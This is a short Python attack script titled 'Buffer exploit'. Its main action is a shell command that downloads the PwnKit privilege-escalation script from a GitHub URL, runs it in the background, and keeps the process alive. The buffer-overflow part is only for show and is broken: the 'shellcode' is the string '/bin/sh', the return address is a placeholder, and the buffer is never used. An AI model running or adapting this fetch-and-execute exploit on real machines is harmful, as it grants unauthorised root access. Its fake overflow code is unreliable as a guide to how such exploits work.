import subprocess
import os
import time

def display_banner():
    banner = """
     +-+-+-+-+-+-+ +-+-+-+-+-+-+-+
     |B|u|f|f|e|r| |e|x|p|l|o|i|t|
     +-+-+-+-+-+-+ +-+-+-+-+-+-+-+
    """
    print(banner)

def inject_command(command):
    try:
        # Execute the command without waiting for it to finish
        process = subprocess.Popen(command, shell=True)
        return process
    except Exception as e:
        return None

def simulate_large_buffer():
    buffer_size = 1000
    buffer = bytearray(buffer_size)
    nop_sled_size = 200
    shellcode = b"/bin/sh"
    return_address = b"\xde\xad\xbe\xef"  # Example return address, not used in this context
    buffer[:nop_sled_size] = b"\x90" * nop_sled_size
    buffer[nop_sled_size:nop_sled_size+len(shellcode)] = shellcode
    buffer[-4:] = return_address
    return buffer

if __name__ == "__main__":
    display_banner()
    
    # Prepare the payload
    buffer = simulate_large_buffer()
    
    # Command to inject
    command = 'sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"'
    
    # Inject the command
    process = inject_command(command)
    
    if process:
        print("Success! Command injected and is running in the background.")
    else:
        print("Failed to inject command.")

    # Keep the script running without stopping the injected command
    while True:
        time.sleep(1)
